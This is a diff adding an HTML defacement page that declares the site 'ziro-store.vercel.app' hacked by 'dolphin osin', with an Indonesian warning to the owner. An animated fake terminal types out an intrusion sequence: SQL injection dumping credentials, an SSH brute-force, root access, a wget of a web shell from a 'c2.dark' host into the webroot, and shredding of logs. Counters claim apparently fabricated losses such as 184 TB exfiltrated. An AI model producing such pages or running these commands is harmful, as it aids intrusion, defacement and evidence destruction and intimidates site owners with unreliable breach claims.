@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HACKED — ziro-store.vercel.app</title>
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%;overflow:hidden;background:#000}
+  body{
+    font-family:'Share Tech Mono',monospace;
+    color:#00ff41;
+    cursor:crosshair;
+  }
+
+  #matrix{position:fixed;inset:0;z-index:0;opacity:.5}
+  .scanlines{
+    position:fixed;inset:0;pointer-events:none;z-index:20;
+    background:repeating-linear-gradient(to bottom,
+      rgba(0,0,0,0) 0,rgba(0,0,0,0) 2px,
+      rgba(0,255,65,.04) 3px,rgba(0,0,0,.15) 4px);
+  }
+  .crt{
+    position:fixed;inset:0;pointer-events:none;z-index:21;
+    background:radial-gradient(ellipse at center,transparent 30%,rgba(0,0,0,.88) 100%);
+  }
+
+  .stage{
+    position:relative;z-index:5;height:100vh;
+    display:flex;flex-direction:column;
+    align-items:center;justify-content:center;
+    padding:20px;text-align:center;
+    animation:shake 5s infinite;
+  }
+  @keyframes shake{
+    0%,96%,100%{transform:translate(0)}
+    97%{transform:translate(-1px,1px)}
+    98%{transform:translate(1px,-1px)}
+    99%{transform:translate(-1px,-1px)}
+  }
+
+  .skull{
+    font-size:clamp(48px,7vw,80px);color:#ff0033;
+    text-shadow:0 0 20px #ff0033,0 0 40px #ff0033;
+    animation:pulse 1.5s infinite;
+  }
+  @keyframes pulse{50%{opacity:.5;transform:scale(1.08)}}
+
+  .glitch{
+    font-family:'Orbitron',sans-serif;
+    font-size:clamp(30px,6vw,64px);
+    font-weight:900;color:#fff;
+    letter-spacing:3px;position:relative;
+    text-shadow:0 0 15px #00ff41;
+    margin-top:10px;
+  }
+  .glitch::before,.glitch::after{
+    content:attr(data-text);
+    position:absolute;top:0;left:0;width:100%;
+  }
+  .glitch::before{
+    color:#ff0033;clip-path:polygon(0 0,100% 0,100% 45%,0 45%);
+    animation:ga 2.5s infinite alternate-reverse;
+  }
+  .glitch::after{
+    color:#00e5ff;clip-path:polygon(0 60%,100% 60%,100% 100%,0 100%);
+    animation:gb 3s infinite alternate-reverse;
+  }
+  @keyframes ga{
+    0%{transform:translate(0)}20%{transform:translate(-3px,2px)}
+    40%{transform:translate(3px,-2px)}60%{transform:translate(-2px,1px)}
+    80%{transform:translate(2px,-1px)}100%{transform:translate(0)}
+  }
+  @keyframes gb{
+    0%{transform:translate(0)}25%{transform:translate(2px,-1px)}
+    50%{transform:translate(-2px,2px)}75%{transform:translate(1px,-2px)}
+    100%{transform:translate(0)}
+  }
+
+  .target{
+    font-family:'VT323',monospace;
+    font-size:clamp(16px,2.5vw,24px);
+    color:#ffb000;margin-top:10px;letter-spacing:3px;
+    text-shadow:0 0 8px #ffb000;
+  }
+  .target span{color:#00e5ff}
+
+  .by{
+    font-family:'VT323',monospace;
+    font-size:clamp(18px,3vw,26px);
+    color:#00ff41;margin-top:6px;letter-spacing:5px;
+    text-shadow:0 0 10px #00ff41;
+  }
+  .by b{color:#ff0033;text-shadow:0 0 12px #ff0033}
+
+  .terminal{
+    width:min(680px,92vw);margin-top:22px;
+    background:rgba(0,15,5,.85);
+    border:1px solid #008f1f;border-radius:6px;
+    box-shadow:0 0 30px rgba(0,255,65,.25);
+    overflow:hidden;backdrop-filter:blur(2px);
+  }
+  .th{
+    background:#008f1f;color:#000;padding:6px 12px;
+    font-size:13px;font-weight:bold;
+    display:flex;align-items:center;gap:8px;
+  }
+  .dot{width:11px;height:11px;border-radius:50%}
+  .dot.r{background:#ff5f56}.dot.y{background:#ffbd2e}.dot.g{background:#27c93f}
+  .tt{margin-left:auto;letter-spacing:1px}
+
+  .tb{
+    height:190px;padding:12px 14px;font-size:13px;
+    line-height:1.55;overflow:hidden;text-align:left;
+  }
+  .tb .ln{white-space:pre-wrap;word-break:break-word}
+  .ok{color:#00ff41}.warn{color:#ffb000}
+  .err{color:#ff0033}.info{color:#00e5ff}
+  .cur{
+    display:inline-block;width:8px;height:14px;
+    background:#00ff41;vertical-align:middle;
+    animation:bl 1s steps(2) infinite;
+  }
+  @keyframes bl{50%{opacity:0}}
+
+  .stats{display:flex;gap:12px;flex-wrap:wrap;justify-content:center;margin-top:20px}
+  .st{
+    background:rgba(0,0,0,.7);border:1px solid #008f1f;
+    padding:8px 16px;font-family:'VT323',monospace;
+    font-size:16px;min-width:150px;text-align:center;
+    position:relative;overflow:hidden;
+  }
+  .st::before{
+    content:'';position:absolute;top:0;left:-100%;
+    width:100%;height:100%;
+    background:linear-gradient(90deg,transparent,rgba(0,255,65,.2),transparent);
+    animation:scan 3s infinite;
+  }
+  @keyframes scan{100%{left:100%}}
+  .st .l{color:#008f1f;font-size:11px;letter-spacing:2px;text-transform:uppercase}
+  .st .v{font-size:22px;color:#fff;text-shadow:0 0 8px #00ff41;display:block;margin-top:2px}
+
+  .warn-box{
+    margin-top:22px;border:2px solid #ff0033;
+    padding:12px 20px;background:rgba(40,0,5,.7);
+    max-width:640px;box-shadow:0 0 25px rgba(255,0,51,.4);
+    animation:wp 1.2s infinite;
+  }
+  @keyframes wp{
+    50%{box-shadow:0 0 45px rgba(255,0,51,.7)}
+  }
+  .warn-box .big{
+    font-family:'Orbitron',sans-serif;font-weight:900;
+    color:#ff0033;font-size:clamp(14px,2.4vw,20px);
+    letter-spacing:2px;text-shadow:0 0 12px #ff0033;
+  }
+  .warn-box .sm{margin-top:6px;color:#fff;font-size:13px;opacity:.9}
+  .warn-box .sg{margin-top:6px;color:#ffb000;font-size:12px;letter-spacing:2px}
+
+  .alerts{
+    position:fixed;top:16px;right:16px;z-index:30;
+    display:flex;flex-direction:column;gap:6px;pointer-events:none;
+  }
+  .al{
+    background:rgba(0,0,0,.85);border-left:3px solid #ff0033;
+    padding:6px 12px;font-size:11px;color:#ff0033;
+    animation:si .3s ease-out,fo .5s ease-in 2.5s forwards;
+    max-width:260px;
+  }
+  @keyframes si{from{transform:translateX(120%);opacity:0}to{transform:translateX(0);opacity:1}}
+  @keyframes fo{to{opacity:0;transform:translateX(120%)}}
+
+  .footer{
+    position:fixed;bottom:8px;left:0;right:0;
+    text-align:center;z-index:6;font-size:10px;
+    color:#008f1f;letter-spacing:2px;
+  }
+
+  @media(max-width:600px){
+    .tb{height:150px;font-size:11px}
+    .st{min-width:120px;padding:6px 10px;font-size:13px}
+    .st .v{font-size:18px}
+  }
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+<div class="scanlines"></div>
+<div class="crt"></div>
+<div class="alerts" id="alerts"></div>
+
+<main class="stage">
+  <div class="skull">☠</div>
+  <h1 class="glitch" data-text="HACKED">HACKED</h1>
+  <div class="target">TARGET: <span>ziro-store.vercel.app</span></div>
+  <div class="by">DEFACED BY <b>dolphin osin</b></div>
+
+  <section class="terminal">
+    <div class="th">
+      <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+      <span class="tt">root@ziro-store:~#</span>
+    </div>
+    <div class="tb" id="tb"></div>
+  </section>
+
+  <div class="stats">
+    <div class="st"><div class="l">Data Exfiltrated</div><span class="v" id="d1">0 TB</span></div>
+    <div class="st"><div class="l">Files Encrypted</div><span class="v" id="d2">0</span></div>
+    <div class="st"><div class="l">System Pwned</div><span class="v" id="d3">0%</span></div>
+  </div>
+
+  <div class="warn-box">
+    <div class="big">⚠ SEGERA PERBAIKI WEBSITE ANDA ⚠</div>
+    <div class="sm">Keamanan server nol. Semua data telah di-ekstrak dan dienkripsi.</div>
+    <div class="sg">— dolphin osin was here —</div>
+  </div>
+</main>
+
+<div class="footer">UNAUTHORIZED ACCESS · IP 103.21.244.18 · TRACE IN PROGRESS · 0x7F4A2B</div>
+
+<script>
+/* MATRIX */
+const c=document.getElementById('matrix'),x=c.getContext('2d');
+let W,H,col,drops;const fs=16;
+const ch='アァカサタナハマヤラワガザダバパ0123456789ABCDEF<>{}[]/\\|+*=$#@!?';
+function rz(){
+  W=c.width=innerWidth;H=c.height=innerHeight;
+  col=Math.floor(W/fs);
+  drops=Array(col).fill(0).map(()=>Math.random()*-50);
+}
+rz();addEventListener('resize',rz);
+function dm(){
+  x.fillStyle='rgba(0,0,0,0.08)';x.fillRect(0,0,W,H);
+  x.font=fs+"px 'Share Tech Mono',monospace";
+  for(let i=0;i<drops.length;i++){
+    const s=ch[Math.floor(Math.random()*ch.length)];
+    x.fillStyle=Math.random()>.975?'#aaffaa':'#00ff41';
+    x.fillText(s,i*fs,drops[i]*fs);
+    if(drops[i]*fs>H&&Math.random()>.975)drops[i]=0;
+    drops[i]++;
+  }
+}
+setInterval(dm,45);
+
+/* TERMINAL */
+const tb=document.getElementById('tb');
+const log=[
+  {t:'> nmap -sV ziro-store.vercel.app',c:'info'},
+  {t:'   443/tcp  open  https  nginx',c:''},
+  {t:'   22/tcp   open  ssh    OpenSSH 8.9',c:''},
+  {t:'> sqlmap -u "https://ziro-store.vercel.app/?id=1" --dbs',c:'warn'},
+  {t:'   [+] GET param "id" is injectable!',c:'err'},
+  {t:'   [+] available databases: ziro_db, admin, users',c:'ok'},
+  {t:'> sqlmap --dump -D users -T credentials',c:'warn'},
+  {t:'   [+] 4,829 rows dumped to /tmp/creds.csv',c:'err'},
+  {t:'> hydra -l admin -P rockyou.txt ssh://target',c:'warn'},
+  {t:'   [22][ssh] host: target  login: admin  pass: ********',c:'err'},
+  {t:'> ssh admin@target "sudo su -"',c:'info'},
+  {t:'   [root@ziro-store ~]# whoami',c:'ok'},
+  {t:'   root',c:'err'},
+  {t:'> tar czf /tmp/backup.tar.gz /var/www/html/',c:'warn'},
+  {t:'> rm -rf /var/www/html/index.html',c:'err'},
+  {t:'> wget http://c2.dark/shell.php -O /var/www/html/index.php',c:'err'},
+  {t:'> echo "defaced by dolphin osin" > /var/www/html/defaced.txt',c:'err'},
+  {t:'> shred -vfz /var/log/*',c:'err'},
+  {t:'> history -c && exit',c:'warn'},
+  {t:'',c:''},
+  {t:'> MISSION COMPLETE — ziro-store.vercel.app PWNED',c:'err'},
+  {t:'> dolphin osin was here.',c:'ok'},
+];
+let li=0,ci=0;
+function tl(){
+  if(li>=log.length){
+    setTimeout(()=>{tb.innerHTML='';li=0;ci=0;tl();},6000);return;
+  }
+  const cur=log[li];
+  if(ci<=cur.t.length){
+    let h='';
+    for(let i=0;i<li;i++){const l=log[i];h+=`<div class="ln ${l.c}">${e(l.t)}</div>`;}
+    h+=`<div class="ln ${cur.c}">${e(cur.t.slice(0,ci))}<span class="cur"></span></div>`;
+    tb.innerHTML=h;tb.scrollTop=tb.scrollHeight;
+    ci++;
+    setTimeout(tl,cur.t[ci-1]===' '?10:20+Math.random()*28);
+  }else{li++;ci=0;setTimeout(tl,220+Math.random()*280);}
+}
+function e(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+tl();
+
+/* COUNTERS */
+function ac(id,t,suf,dur){
+  const el=document.getElementById(id),st=performance.now();
+  function step(n){
+    const p=Math.min((n-st)/dur,1),ea=1-Math.pow(1-p,3);
+    el.textContent=Math.floor(ea*t).toLocaleString('id-ID')+suf;
+    if(p<1)requestAnimationFrame(step);
+  }
+  requestAnimationFrame(step);
+}
+setTimeout(()=>{
+  ac('d1',184,' TB',8000);
+  ac('d2',92847,'',9000);
+  ac('d3',100,'%',7000);
+},1500);
+
+/* ALERTS */
+const ae=document.getElementById('alerts');
+const ms=[
+  'CRITICAL: SQL injection detected',
+  'WARNING: Root shell spawned',
+  'ALERT: Database dumped (4,829 rows)',
+  'ERROR: SSH brute-force success',
+  'CRITICAL: index.html overwritten',
+  'WARNING: Web shell uploaded',
+  'ALERT: Logs shredded',
+  'ERROR: Firewall disabled',
+  'CRITICAL: Backdoor on :31337',
+  'WARNING: C2 beacon sent'
+];
+function sa(){
+  const m=ms[Math.floor(Math.random()*ms.length)];
+  const d=document.createElement('div');d.className='al';
+  d.textContent='[!] '+m;ae.appendChild(d);
+  setTimeout(()=>d.remove(),3200);
+  setTimeout(sa,1700+Math.random()*2200);
+}
+setTimeout(sa,2000);
+
+/* CLICK BURST */
+addEventListener('click',e=>{
+  const b=document.createElement('div');
+  const hx=['0xDEAD','0xBEEF','0xCAFE','0x1337','PWNED','BREACH','0xFACE','HACKED'];
+  b.textContent=hx[Math.floor(Math.random()*hx.length)];
+  b.style.cssText=`position:fixed;left:${e.clientX}px;top:${e.clientY}px;color:#ff0033;font-family:'Share Tech Mono',monospace;font-size:14px;pointer-events:none;z-index:50;text-shadow:0 0 8px #ff0033;transform:translate(-50%,-50%);transition:all .8s ease-out;`;
+  document.body.appendChild(b);
+  requestAnimationFrame(()=>{
+    b.style.transform=`translate(${(Math.random()-.5)*200}px,${(Math.random()-.5)*200}px) scale(2)`;
+    b.style.opacity='0';
+  });
+  setTimeout(()=>b.remove(),800);
+});
+</script>
+</body>
+</html>
